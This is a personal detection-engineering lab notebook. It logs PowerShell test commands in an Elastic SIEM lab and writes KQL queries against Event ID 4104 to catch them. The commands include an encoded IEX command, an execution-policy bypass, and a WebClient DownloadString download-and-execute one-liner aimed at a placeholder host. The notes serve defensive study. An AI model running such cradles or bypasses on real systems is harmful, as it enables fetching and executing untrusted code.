# SIEM Lab Notes

## Overview
Hands-on SIEM and detection engineering lab using Elastic Stack.  
This lab focuses on detecting suspicious Windows and PowerShell activity using real telemetry and custom detection queries.

---

## Lab Environment

- VMware Workstation
- Windows Server 2025 (Domain Controller)
- Windows 11 endpoint
- Ubuntu (Elastic Stack host)

Logs from Windows systems are ingested into Elastic SIEM for analysis and detection building.

---

## PowerShell Detection Labs

### 🔹 Encoded PowerShell Command Detection

Test Command:
```powershell
powershell -enc SQBFAFgAIAAiAFQARQBTAFQAIgA=
```

Observed Behavior:
- Command was base64 encoded but decoded and executed as:

```powershell
IEX "TEST"
```

Detection:
- Event ID: 4104 (Script Block Logging)
- Field used:

```text
powershell.file.script_block_text
```

Example Result:
```text
Creating Scriptblock text (1 of 1):
IEX "TEST"
```

---

### 🔹 Execution Policy Bypass Detection

Test Command:
```powershell
IEX "Set-ExecutionPolicy Bypass -Scope Process -Force"
```

Observed Behavior:
- Command logged successfully in Script Block Logging (4104)

Detection Queries:

Broad search:
```kql
event.dataset: "windows.powershell_operational"
and event.code: 4104
```

Refined detection:
```kql
event.dataset: "windows.powershell_operational"
and event.code: 4104
and powershell.file.script_block_text: *ExecutionPolicy*
```

---

## Key Learnings

- PowerShell Script Block Logging (Event ID 4104) captures executed script content
- Encoded PowerShell commands (`-enc`) are logged in decoded form
- Base64 encoding is not encryption, only obfuscation
- Not all PowerShell commands generate meaningful detection signals
- Effective detection requires query tuning and validation
- KQL behavior varies with wildcards, quotes, and tokenization

---

## Detection Strategy Notes

- Start with broad queries (`event.code: 4104`) before refining
- Validate detection logic using actual log data
- Focus on high-signal behaviors (IEX, execution policy bypass, encoded commands)
- Avoid relying on exact string matches without verifying field format

---

## Next Steps

- Detect PowerShell download activity (DownloadString / Invoke-WebRequest)
- Build Kibana alert rules for suspicious command execution
- Expand detection coverage for common attack techniques

- ---

### 🔹 PowerShell Download Detection (WebClient)

Test Command:
```powershell
IEX (New-Object Net.WebClient).DownloadString("https://example.com")
```

Observed Behavior:
- PowerShell downloaded remote content and executed it dynamically in memory

Detection:
- Event ID: 4104 captured the full command
- Script block shows:

```powershell
IEX (New-Object Net.WebClient).DownloadString("https://example.com")
```

Detection Query:
```kql
event.dataset: "windows.powershell_operational"
and event.code: 4104
and (
  powershell.file.script_block_text: *DownloadString*
  or powershell.file.script_block_text: *WebClient*
)
```

---


